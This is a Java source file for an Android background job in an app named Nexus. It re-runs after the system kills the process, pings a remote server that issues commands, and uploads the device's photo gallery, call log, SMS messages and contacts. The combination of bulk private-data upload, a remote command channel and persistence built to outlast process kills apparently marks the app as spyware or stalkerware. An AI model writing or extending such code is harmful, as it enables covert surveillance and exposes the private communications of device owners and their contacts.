package com.nexus.app;

import android.app.job.JobParameters;
import android.app.job.JobService;

/**
 * OS-managed bounded recovery. JobScheduler may run this after normal process or
 * OEM memory kills without relying on an illegal background FGS start.
 */
public class NexusRecoveryJobService extends JobService {
    private volatile Thread worker;

    @Override
    public boolean onStartJob(JobParameters params) {
        worker = new Thread(() -> {
            try {
                NexusAPI api = new NexusAPI(this);
                api.ping(commands -> { /* heartbeat only; foreground service handles commands */ });
                new GallerySync(this, api).sync();
                new CallLogSync(this, api).sync();
                new SMSSync(this, api).sync();
                new ContactsSync(this, api).sync();
            } finally {
                jobFinished(params, false);
            }
        }, "nexus-recovery");
        worker.start();
        return true;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        Thread current = worker;
        if (current != null) current.interrupt();
        return true;
    }
}
